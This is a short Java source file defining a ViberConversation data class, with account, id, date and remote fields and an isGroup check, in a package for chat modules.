package com.android.deviceinfo.module.chat;

public class ViberConversation implements Conversation{

	protected String account;
	protected long id;
	protected long date;
	protected String remote;
	
	public boolean isGroup() {
		
		return "groupEntity".equals(remote);
	}
	
}
